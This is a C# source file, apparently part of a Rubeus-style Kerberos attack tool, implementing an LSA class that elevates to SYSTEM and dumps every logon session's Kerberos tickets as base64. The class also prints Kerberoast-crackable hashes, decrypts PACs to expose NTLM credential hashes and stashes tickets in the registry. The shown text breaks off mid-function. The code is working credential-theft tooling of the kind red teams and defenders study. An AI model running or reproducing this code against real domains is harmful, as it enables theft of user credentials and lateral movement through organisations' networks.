using Asn1;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.AccessControl;
using System.Globalization;
using Microsoft.Win32;
using ConsoleTables;
using System.Security.Principal;
using IRH.Kerberos.lib.Interop;
using System.IO;
using IRH.Kerberos.Kerberos;
using IRH.Kerberos.Kerberos.PAC;
using System.Linq;

namespace IRH.Kerberos
{
    public class LSA
    {
        #region LSA interaction

        public enum TicketDisplayFormat : int
        {
            None = 0,                 
            Triage = 1,            
            Klist = 2,             
            Full = 3                   
        }

        public class SESSION_CRED
        {
            public LogonSessionData LogonSession;

            public List<KRB_TICKET> Tickets;
        }

        public class KRB_TICKET
        {
            public string ClientName;
            public string ClientRealm;
            public string ServerName;
            public string ServerRealm;
            public DateTime StartTime;
            public DateTime EndTime;
            public DateTime RenewTime;
            public Int32 EncryptionType;
            public Interop.TicketFlags TicketFlags;
            public KRB_CRED KrbCred;
        }

        public static IntPtr GetLsaHandle(bool elevateToSystem = true)
        {
            IntPtr lsaHandle = IntPtr.Zero;

            if (Helpers.IsHighIntegrity() && elevateToSystem && !Helpers.IsSystem())
            {
                if (!Helpers.GetSystem())
                {
                    throw new Exception("Could not elevate to system");
                }

                Interop.LsaConnectUntrusted(out lsaHandle);
                Interop.RevertToSelf();

            }
            else
            {
                Interop.LsaConnectUntrusted(out lsaHandle);
            }

            return lsaHandle;
        }

        public static KRB_CRED ExtractTicket(IntPtr lsaHandle, int authPack, LUID userLogonID, string targetName, UInt32 ticketFlags = 0)
        {
            var responsePointer = IntPtr.Zero;
            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();
            var returnBufferLength = 0;
            var protocalStatus = 0;
            KRB_CRED ticketKirbi = null;

            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;

            request.LogonId = userLogonID;
            request.TicketFlags = 0x0;
            request.CacheOptions = 0x8;          
            request.EncryptionType = 0x0;

            var tName = new Interop.UNICODE_STRING(targetName);
            request.TargetName = tName;

            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            var newStructSize = structSize + tName.MaximumLength;
            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            Marshal.StructureToPtr(request, unmanagedAddr, false);

            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);

            int retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack,
                unmanagedAddr, newStructSize, out responsePointer,
                out returnBufferLength, out protocalStatus);

            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            if ((retCode == 0) && ((uint)winError == 0) &&
                (returnBufferLength != 0))
            {
                response =
                    (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
                        (System.IntPtr)responsePointer,
                        typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                var encodedTicketSize = response.Ticket.EncodedTicketSize;

                var encodedTicket = new byte[encodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0,
                    encodedTicketSize);

                ticketKirbi = new KRB_CRED(encodedTicket);
            }
            else
            {
                var errorMessage = new Win32Exception((int)winError).Message;
                Console.WriteLine(
                    "\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                    winError, targetName, errorMessage);
            }

            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            return ticketKirbi;
        }

        public static List<SESSION_CRED> EnumerateTickets(bool extractTicketData = false, LUID targetLuid = new LUID(), string targetService = null, string targetUser = null, string targetServer = null, bool includeComputerAccounts = true, bool silent = false)
        {

            if (!Helpers.IsHighIntegrity() && (((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(targetUser))))
            {
                Console.WriteLine("[X] You need to be in high integrity for the actions specified.");
                return null;
            }

            if (!silent)
            {
                if (!String.IsNullOrEmpty(targetService))
                {
                    Console.WriteLine("[*] Target service  : {0:x}", targetService);
                }
                if (!String.IsNullOrEmpty(targetServer))
                {
                    Console.WriteLine("[*] Target server   : {0:x}", targetServer);
                }
                if (!String.IsNullOrEmpty(targetUser))
                {
                    Console.WriteLine("[*] Target user     : {0:x}", targetUser);
                }
                if (((ulong)targetLuid != 0))
                {
                    Console.WriteLine("[*] Target LUID     : {0:x}", targetLuid);
                }

                Console.WriteLine("[*] Current LUID    : {0}\r\n", Helpers.GetCurrentLUID());
            }

            int retCode;
            int authPack;
            var name = "kerberos";
            var sessionCreds = new List<SESSION_CRED>();

            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            var lsaHandle = GetLsaHandle();

            try
            {
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                foreach (var luid in EnumerateLogonSessions())
                {
                    if (((ulong)targetLuid != 0) && (luid != targetLuid))
                        continue;

                    var logonSessionData = new LogonSessionData();
                    try
                    {
                        logonSessionData = GetLogonSessionData(luid);
                    }
                    catch
                    {
                        continue;
                    }

                    SESSION_CRED sessionCred = new SESSION_CRED();
                    sessionCred.LogonSession = logonSessionData;
                    sessionCred.Tickets = new List<KRB_TICKET>();

                    if (!includeComputerAccounts && Regex.IsMatch(logonSessionData.Username, ".*\\$$"))
                        continue;
                    if (!String.IsNullOrEmpty(targetUser) && !Regex.IsMatch(logonSessionData.Username, Regex.Escape(targetUser), RegexOptions.IgnoreCase))
                        continue;

                    var ticketsPointer = IntPtr.Zero;
                    var returnBufferLength = 0;
                    var protocalStatus = 0;

                    var ticketCacheRequest = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                    var ticketCacheResponse = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                    Interop.KERB_TICKET_CACHE_INFO_EX ticketCacheResult;

                    ticketCacheRequest.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
                    if (Helpers.IsHighIntegrity())
                    {
                        ticketCacheRequest.LogonId = logonSessionData.LogonID;
                    }
                    else
                    {
                        ticketCacheRequest.LogonId = new LUID();
                    }

                    var tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));
                    Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);

                    retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr,
                        Marshal.SizeOf(ticketCacheRequest), out ticketsPointer, out returnBufferLength,
                        out protocalStatus);

                    if (retCode != 0)
                    {
                        throw new NtException(retCode);
                    }

                    if (ticketsPointer != IntPtr.Zero)
                    {
                        ticketCacheResponse = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(
                            (System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                        var count2 = ticketCacheResponse.CountOfTickets;

                        if (count2 != 0)
                        {
                            bool krbtgtFound = false;             

                            var dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                            for (var j = 0; j < count2; j++)
                            {
                                var currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                ticketCacheResult = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(
                                    currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                                KRB_TICKET ticket = new KRB_TICKET();
                                ticket.StartTime = DateTime.FromFileTime(ticketCacheResult.StartTime);
                                ticket.EndTime = DateTime.FromFileTime(ticketCacheResult.EndTime);
                                ticket.RenewTime = DateTime.FromFileTime(ticketCacheResult.RenewTime);
                                ticket.TicketFlags = (Interop.TicketFlags)ticketCacheResult.TicketFlags;
                                ticket.EncryptionType = ticketCacheResult.EncryptionType;
                                ticket.ServerName = Marshal.PtrToStringUni(ticketCacheResult.ServerName.Buffer, ticketCacheResult.ServerName.Length / 2);
                                ticket.ServerRealm = Marshal.PtrToStringUni(ticketCacheResult.ServerRealm.Buffer, ticketCacheResult.ServerRealm.Length / 2);
                                ticket.ClientName = Marshal.PtrToStringUni(ticketCacheResult.ClientName.Buffer, ticketCacheResult.ClientName.Length / 2);
                                ticket.ClientRealm = Marshal.PtrToStringUni(ticketCacheResult.ClientRealm.Buffer, ticketCacheResult.ClientRealm.Length / 2);

                                bool includeTicket = true;

                                if (!String.IsNullOrEmpty(targetService) && !Regex.IsMatch(ticket.ServerName, String.Format(@"^{0}/.*", Regex.Escape(targetService)), RegexOptions.IgnoreCase))
                                {
                                    includeTicket = false;
                                }
                                if (!String.IsNullOrEmpty(targetServer) && !Regex.IsMatch(ticket.ServerName, String.Format(@".*/{0}", Regex.Escape(targetServer)), RegexOptions.IgnoreCase))
                                {
                                    includeTicket = false;
                                }

                                if (Regex.IsMatch(ticket.ServerName, @"^krbtgt/.*", RegexOptions.IgnoreCase))
                                {
                                    if (krbtgtFound)
                                    {
                                        includeTicket = false;
                                    }
                                    else
                                    {
                                        krbtgtFound = true;
                                    }
                                }

                                if (includeTicket)
                                {
                                    if (extractTicketData)
                                    {
                                        ticket.KrbCred = ExtractTicket(lsaHandle, authPack, ticketCacheRequest.LogonId, ticket.ServerName, ticketCacheResult.TicketFlags);
                                    }
                                    sessionCred.Tickets.Add(ticket);
                                }
                            }
                        }
                    }

                    Interop.LsaFreeReturnBuffer(ticketsPointer);
                    Marshal.FreeHGlobal(tQueryPtr);

                    sessionCreds.Add(sessionCred);
                }

                Interop.LsaDeregisterLogonProcess(lsaHandle);

                return sessionCreds;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
                return null;
            }
        }

        #endregion


        #region Output

        public static void DisplaySessionCreds(List<SESSION_CRED> sessionCreds, TicketDisplayFormat displayFormat, bool showAll = false)
        {
            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");

            foreach (var sessionCred in sessionCreds)
            {
                if ((sessionCred.Tickets.Count == 0) && (!showAll))
                {
                    continue;
                }

                if ((displayFormat == TicketDisplayFormat.Full) || displayFormat == TicketDisplayFormat.Klist)
                {
                    Console.WriteLine("  UserName                 : {0}", sessionCred.LogonSession.Username);
                    Console.WriteLine("  Domain                   : {0}", sessionCred.LogonSession.LogonDomain);
                    Console.WriteLine("  LogonId                  : {0}", sessionCred.LogonSession.LogonID);
                    Console.WriteLine("  UserSID                  : {0}", sessionCred.LogonSession.Sid);
                    Console.WriteLine("  AuthenticationPackage    : {0}", sessionCred.LogonSession.AuthenticationPackage);
                    Console.WriteLine("  LogonType                : {0}", sessionCred.LogonSession.LogonType);
                    Console.WriteLine("  LogonTime                : {0}", sessionCred.LogonSession.LogonTime);
                    Console.WriteLine("  LogonServer              : {0}", sessionCred.LogonSession.LogonServer);
                    Console.WriteLine("  LogonServerDNSDomain     : {0}", sessionCred.LogonSession.DnsDomainName);
                    Console.WriteLine("  UserPrincipalName        : {0}\r\n", sessionCred.LogonSession.Upn);
                }

                for (int j = 0; j < sessionCred.Tickets.Count; j++)
                {
                    var ticket = sessionCred.Tickets[j];

                    if (displayFormat == TicketDisplayFormat.Triage)
                    {
                        table.AddRow(sessionCred.LogonSession.LogonID.ToString(), String.Format("{0} @ {1}", ticket.ClientName, ticket.ClientRealm), ticket.ServerName, ticket.EndTime.ToString());
                    }
                    else if (displayFormat == TicketDisplayFormat.Klist)
                    {
                        Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", j, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);
                        Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", ticket.StartTime, ticket.EndTime, ticket.RenewTime);
                        Console.WriteLine("      Server Name       : {0} @ {1}", ticket.ServerName, ticket.ServerRealm);
                        Console.WriteLine("      Client Name       : {0} @ {1}", ticket.ClientName, ticket.ClientRealm);
                        Console.WriteLine("      Flags             : {0} ({1:x})\r\n", ticket.TicketFlags, (UInt32)ticket.TicketFlags);
                    }
                    else if (displayFormat == TicketDisplayFormat.Full)
                    {
                        if (ticket.KrbCred != null)
                        {
                            DisplayTicket(ticket.KrbCred, 4, false, true, false);
                        }
                    }
                }
            }

            if (displayFormat == TicketDisplayFormat.Triage)
            {
                table.Write();
            }
        }

        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = true, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null, string desPlainText = "")
        {
            var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            var principalType = cred.enc_part.ticket_info[0].pname.name_type.ToString();
            var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
            var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
            var eType = (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype;
            var base64ticket = Convert.ToBase64String(cred.Encode().Encode());
            string indent = new string(' ', indentLevel);
            string serviceName = sname.Split('/')[0];


            if (displayTGT)
            {
                Console.WriteLine("{0}User                  :  {1}@{2}", indent, userName, cred.enc_part.ticket_info[0].prealm);
                Console.WriteLine("{0}StartTime             :  {1}", indent, cred.enc_part.ticket_info[0].starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("{0}EndTime               :  {1}", indent, cred.enc_part.ticket_info[0].endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("{0}RenewTill             :  {1}", indent, cred.enc_part.ticket_info[0].renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("{0}Flags                 :  {1}", indent, cred.enc_part.ticket_info[0].flags);
                Console.WriteLine("{0}Base64EncodedTicket   :\r\n", indent);

                if (Program.wrapTickets)
                {
                    foreach (var line in Helpers.Split(base64ticket, 100))
                    {
                        Console.WriteLine("{0}  {1}", indent, line);
                    }
                }
                else
                {
                    Console.WriteLine("{0}  {1}", indent, base64ticket);
                }
            }
            else
            {
                Console.WriteLine("\r\n{0}ServiceName              :  {1}", indent, sname);
                Console.WriteLine("{0}ServiceRealm             :  {1}", indent, cred.enc_part.ticket_info[0].srealm);
                Console.WriteLine("{0}UserName                 :  {1}", indent, $"{userName} ({principalType})");
                Console.WriteLine("{0}UserRealm                :  {1}", indent, cred.enc_part.ticket_info[0].prealm);
                Console.WriteLine("{0}StartTime                :  {1}", indent, cred.enc_part.ticket_info[0].starttime.ToLocalTime());
                Console.WriteLine("{0}EndTime                  :  {1}", indent, cred.enc_part.ticket_info[0].endtime.ToLocalTime());
                Console.WriteLine("{0}RenewTill                :  {1}", indent, cred.enc_part.ticket_info[0].renew_till.ToLocalTime());
                Console.WriteLine("{0}Flags                    :  {1}", indent, cred.enc_part.ticket_info[0].flags);
                Console.WriteLine("{0}KeyType                  :  {1}", indent, keyType);
                Console.WriteLine("{0}Base64(key)              :  {1}", indent, b64Key);

                if (keyList != null)
                {
                    Console.WriteLine("{0}Password Hash            :  {2}", indent, userName, Helpers.ByteArrayToString(keyList));
                }

                if (asrepKey != null)
                    Console.WriteLine("{0}ASREP (key)              :  {1}", indent, Helpers.ByteArrayToString(asrepKey));

                if (cred.tickets[0].enc_part.kvno > 65535)
                {
                    uint rodcNum = cred.tickets[0].enc_part.kvno >> 16;
                    Console.WriteLine("{0}RODC Number              :  {1}", indent, rodcNum);
                }

                if (displayB64ticket)
                {
                    Console.WriteLine("{0}Base64EncodedTicket   :\r\n", indent);
                    if (Program.wrapTickets)
                    {
                        foreach (var line in Helpers.Split(base64ticket, 100))
                        {
                            Console.WriteLine("{0}  {1}", indent, line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("{0}  {1}", indent, base64ticket);
                    }
                }

                else if (extractKerberoastHash && (serviceName != "krbtgt"))
                {
                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                    {
                        Console.WriteLine("\r\n[!] Service ticket uses encryption type '{0}', unable to extract hash and salt.", eType);
                    }
                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac) || eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                    {
                        Roast.DisplayTGShash(cred, desPlainText: desPlainText);
                    }
                    else if (!String.IsNullOrEmpty(serviceUser))
                    {
                        if (String.IsNullOrEmpty(serviceDomain))
                        {
                            serviceDomain = cred.enc_part.ticket_info[0].prealm;
                        }
                        if (serviceUser.EndsWith("$"))
                        {
                            serviceUser = String.Format("host{0}.{1}", serviceUser.TrimEnd('$').ToLower(), serviceDomain.ToLower());
                        }
                        Roast.DisplayTGShash(cred, false, serviceUser, serviceDomain);
                    }
                    else
                    {
                        Console.WriteLine("[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.");
                    }
                }
            }

            if (serviceKey != null)
            {

                try
                {
                    bool displayBlockOne = true;
                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey, false, displayBlockOne);
                    PACTYPE pt = decryptedEncTicket.GetPac(asrepKey);
                    if (pt == null)
                    {
                        Console.WriteLine("[X] Unable to get the PAC");
                        return;
                    }

                    if (krbKey == null && (serviceName == "krbtgt") && (cred.enc_part.ticket_info[0].srealm.ToUpper() == sname.Split('/')[1].ToUpper()))
                    {
                        krbKey = serviceKey;
                    }
                    var validated = decryptedEncTicket.ValidatePac(serviceKey, krbKey);

                    Console.WriteLine("{0}Decrypted PAC            :", indent);

                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
                    {

                        if (pacInfoBuffer is ClientName cn)
                        {
                            Console.WriteLine("{0}  ClientName             :", indent);
                            Console.WriteLine("{0}    Client Id            : {1}", indent, cn.ClientId.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                            Console.WriteLine("{0}    Client Name          : {1}", indent, cn.Name);
                        }
                        else if (pacInfoBuffer is UpnDns upnDns)
                        {
                            Console.WriteLine("{0}  UpnDns                 :", indent);
                            Console.WriteLine("{0}    DNS Domain Name      : {1}", indent, upnDns.DnsDomainName);
                            Console.WriteLine("{0}    UPN                  : {1}", indent, upnDns.Upn);
                            Console.WriteLine("{0}    Flags                : ({1}) {2}", indent, (int)upnDns.Flags, upnDns.Flags);
                            if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
                            {
                                Console.WriteLine("{0}    SamName              : {1}", indent, upnDns.SamName);
                                Console.WriteLine("{0}    Sid                  : {1}", indent, upnDns.Sid.Value);
                            }
                        }
                        else if (pacInfoBuffer is SignatureData sigData)
                        {
                            string validation = "VALID";
                            int i2 = 1;
                            if (sigData.Type == PacInfoBufferType.ServerChecksum && !validated.Item1)
                            {
                                validation = "INVALID";
                            }
                            else if (sigData.Type == PacInfoBufferType.KDCChecksum && !validated.Item2 && krbKey != null)
                            {
                                validation = "INVALID";
                            }
                            else if (sigData.Type == PacInfoBufferType.TicketChecksum && krbKey != null && !validated.Item3)
                            {
                                validation = "INVALID";
                            }
                            else if (sigData.Type == PacInfoBufferType.FullPacChecksum && krbKey != null && !validated.Item4)
                            {
                                validation = "INVALID";
                            }
                            else if ((sigData.Type == PacInfoBufferType.KDCChecksum || sigData.Type == PacInfoBufferType.TicketChecksum || sigData.Type == PacInfoBufferType.FullPacChecksum) && krbKey == null)
                            {
                                validation = "UNVALIDATED";
                            }
                            if (sigData.Type == PacInfoBufferType.KDCChecksum)
                            {
                                i2 = 4;
                            }
                            else if (sigData.Type == PacInfoBufferType.FullPacChecksum)
                            {
                                i2 = 0;
                            }
                            Console.WriteLine("{0}  {1}        {2}:", indent, sigData.Type.ToString(), new string(' ', i2));
                            Console.WriteLine("{0}    Signature Type       : {1}", indent, sigData.SignatureType);
                            Console.WriteLine("{0}    Signature            : {1} ({2})", indent, Helpers.ByteArrayToString(sigData.Signature), validation);
                        }
                        else if (pacInfoBuffer is LogonInfo li)
                        {
                            Console.WriteLine("{0}  LogonInfo              :", indent);
                            try
                            {
                                Console.WriteLine("{0}    LogonTime            : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogonTime.LowDateTime | ((long)li.KerbValidationInfo.LogonTime.HighDateTime << 32)).ToLocalTime());
                            }
                            catch
                            {
                                Console.WriteLine("{0}    LogonTime            : {1}", indent, li.KerbValidationInfo.LogonTime);
                            }
                            try
                            {
                                Console.WriteLine("{0}    LogoffTime           : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());
                            }
                            catch
                            {
                                Console.WriteLine("{0}    LogoffTime           : {1}", indent, li.KerbValidationInfo.LogoffTime);
                            }
                            try
                            {
                                Console.WriteLine("{0}    KickOffTime          : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.KickOffTime.LowDateTime | ((long)li.KerbValidationInfo.KickOffTime.HighDateTime << 32)).ToLocalTime());
                            }
                            catch
                            {
                                Console.WriteLine("{0}    KickOffTime          : {1}", indent, li.KerbValidationInfo.KickOffTime);
                            }
                            try
                            {
                                Console.WriteLine("{0}    PasswordLastSet      : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
                            }
                            catch
                            {
                                Console.WriteLine("{0}    PasswordLastSet      : {1}", indent, li.KerbValidationInfo.PasswordLastSet);
                            }
                            try
                            {
                                Console.WriteLine("{0}    PasswordCanChange    : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32)).ToLocalTime());
                            }
                            catch
                            {
                                Console.WriteLine("{0}    PasswordCanChange    : {1}", indent, li.KerbValidationInfo.PasswordCanChange);
                            }
                            try
                            {
                                Console.WriteLine("{0}    PasswordMustChange   : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32)).ToLocalTime());
                            }
                            catch
                            {
                                Console.WriteLine("{0}    PasswordMustChange   : {1}", indent, li.KerbValidationInfo.PasswordMustChange);
                            }
                            Console.WriteLine("{0}    EffectiveName        : {1}", indent, li.KerbValidationInfo.EffectiveName);
                            Console.WriteLine("{0}    FullName             : {1}", indent, li.KerbValidationInfo.FullName);
                            Console.WriteLine("{0}    LogonScript          : {1}", indent, li.KerbValidationInfo.LogonScript);
                            Console.WriteLine("{0}    ProfilePath          : {1}", indent, li.KerbValidationInfo.ProfilePath);
                            Console.WriteLine("{0}    HomeDirectory        : {1}", indent, li.KerbValidationInfo.HomeDirectory);
                            Console.WriteLine("{0}    HomeDirectoryDrive   : {1}", indent, li.KerbValidationInfo.HomeDirectoryDrive);
                            Console.WriteLine("{0}    LogonCount           : {1}", indent, li.KerbValidationInfo.LogonCount);
                            Console.WriteLine("{0}    BadPasswordCount     : {1}", indent, li.KerbValidationInfo.BadPasswordCount);
                            Console.WriteLine("{0}    UserId               : {1}", indent, li.KerbValidationInfo.UserId);
                            Console.WriteLine("{0}    PrimaryGroupId       : {1}", indent, li.KerbValidationInfo.PrimaryGroupId);
                            Console.WriteLine("{0}    GroupCount           : {1}", indent, li.KerbValidationInfo.GroupCount);
                            if (li.KerbValidationInfo.GroupCount > 0)
                            {
                                Console.WriteLine("{0}    Groups               : {1}", indent, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                            }
                            Console.WriteLine("{0}    UserFlags            : ({1}) {2}", indent, li.KerbValidationInfo.UserFlags, (Interop.PacUserFlags)li.KerbValidationInfo.UserFlags);
                            Console.WriteLine("{0}    UserSessionKey       : {1}", indent, Helpers.ByteArrayToString((byte[])(Array)li.KerbValidationInfo.UserSessionKey.data[0].data));
                            Console.WriteLine("{0}    LogonServer          : {1}", indent, li.KerbValidationInfo.LogonServer);
                            Console.WriteLine("{0}    LogonDomainName      : {1}", indent, li.KerbValidationInfo.LogonDomainName);
                            Console.WriteLine("{0}    LogonDomainId        : {1}", indent, li.KerbValidationInfo.LogonDomainId?.GetValue());
                            Console.WriteLine("{0}    UserAccountControl   : ({1}) {2}", indent, li.KerbValidationInfo.UserAccountControl, (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl);
                            Console.WriteLine("{0}    ExtraSIDCount        : {1}", indent, li.KerbValidationInfo.SidCount);
                            if (li.KerbValidationInfo.SidCount > 0)
                            {
                                Console.WriteLine("{0}    ExtraSIDs            : {1}", indent, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
                            }
                            Console.WriteLine("{0}    ResourceGroupCount   : {1}", indent, li.KerbValidationInfo.ResourceGroupCount);
                            if (li.KerbValidationInfo.ResourceGroupCount > 0)
                            {
                                Console.WriteLine("{0}    ResourceGroupSid     : {1}", indent, li.KerbValidationInfo.ResourceGroupDomainSid?.GetValue());
                                Console.WriteLine("{0}    ResourceGroups       : {1}", indent, li.KerbValidationInfo.ResourceGroupIds?.GetValue().Select(s => s.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                            }
                        }
                        else if (pacInfoBuffer is PacCredentialInfo ci)
                        {

                            Console.WriteLine("{0}  CredentialInfo         :", indent);
                            Console.WriteLine("{0}    Version              : {1}", indent, ci.Version);
                            Console.WriteLine("{0}    EncryptionType       : {1}", indent, ci.EncryptionType);

                            if (ci.CredentialInfo.HasValue)
                            {

                                Console.WriteLine("{0}    CredentialData       :", indent);
                                Console.WriteLine("{0}      CredentialCount    : {1}", indent, ci.CredentialInfo.Value.CredentialCount);

                                foreach (var credData in ci.CredentialInfo.Value.Credentials)
                                {
                                    string hash = "";
                                    if ("NTLM".Equals(credData.PackageName.ToString()))
                                    {
                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);
                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
                                        if (flags == 3)
                                        {
                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
                                        }
                                        else
                                        {
                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
                                        }
                                    }
                                    else
                                    {
                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);
                                    }

                                    Console.WriteLine("          {0}             : {1}", credData.PackageName, hash);
                                }

                            }
                            else
                            {
                                Console.WriteLine("{0}    CredentialData    :   *** NO KEY ***", indent);
                            }
                        }
                        else if (pacInfoBuffer is S4UDelegationInfo s4u)
                        {
                            Console.WriteLine("{0}  S4UDelegationInfo      :", indent);
                            Console.WriteLine("{0}    S4U2ProxyTarget      : {1}", indent, s4u.s4u.S4U2proxyTarget.ToString());
                            Console.WriteLine("{0}    TransitedListSize    : {1}", indent, s4u.s4u.TransitedListSize);
                            Console.WriteLine("{0}    S4UTransitedServices : {1}", indent, s4u.s4u.S4UTransitedServices.GetValue().Select(s => s.ToString()).Aggregate((cur, next) => cur + " <= " + next));
                        }
                        else if (pacInfoBuffer is Requestor requestor)
                        {
                            Console.WriteLine("{0}  Requestor              :", indent);
                            Console.WriteLine("{0}    RequestorSID         : {1}", indent, requestor.RequestorSID.ToString());
                        }
                        else if (pacInfoBuffer is Attributes att)
                        {
                            Console.WriteLine("{0}  Attributes             :", indent);
                            Console.WriteLine("{0}    AttributeLength      : {1}", indent, att.Length);
                            Console.WriteLine("{0}    AttributeFlags       : ({1}) {2}", indent, (int)att.Flags, att.Flags);
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Unable to decrypt the EncTicketPart using key: {0}", Helpers.ByteArrayToString(serviceKey));
                    Console.WriteLine("[!] Check the right key was passed for the encryption type: {0}", (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype);
                }
            }

            Console.WriteLine();
        }

        public static void SaveTicketsToRegistry(List<KRB_CRED> creds, string baseRegistryKey)
        {
            string user = null;
            RegistryKey basePath = null;
            if (Helpers.IsSystem())
            {
                user = "NT AUTHORITY\\SYSTEM";
            }
            else
            {
                user = Environment.UserDomainName + "\\" + Environment.UserName;
            };

            try
            {
                Registry.LocalMachine.CreateSubKey(baseRegistryKey);
                basePath = Registry.LocalMachine.OpenSubKey(baseRegistryKey, RegistryKeyPermissionCheck.ReadWriteSubTree);
                var rs = basePath.GetAccessControl();
                var rar = new RegistryAccessRule(
                    user,
                    RegistryRights.FullControl,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow);
                rs.AddAccessRule(rar);
                basePath.SetAccessControl(rs);
            }
            catch
            {
                Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", baseRegistryKey);
                basePath = null;
            }
            if (basePath != null)
            {
                foreach (var cred in creds)
                {
